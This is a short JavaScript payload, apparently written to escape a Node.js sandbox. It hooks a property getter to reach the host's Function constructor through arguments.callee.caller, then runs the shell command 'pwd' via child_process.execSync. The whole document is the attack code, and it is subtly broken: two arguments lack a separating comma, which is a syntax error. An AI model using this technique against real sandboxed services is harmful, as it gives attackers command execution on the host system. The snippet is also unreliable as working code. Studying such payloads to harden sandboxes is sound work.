(() => {
        const targetKey = Object.keys(this)[0];
        Object.defineProperty(this, targetKey, {
            get: function() {
                return arguments.callee.caller.constructor(
                    console.log(global.process.mainModule.require('child_process').execSync('pwd').toString())
                    "return global.process.mainModule.require('child_process').execSync('pwd').toString()"
                )();
            }
        });
    })();
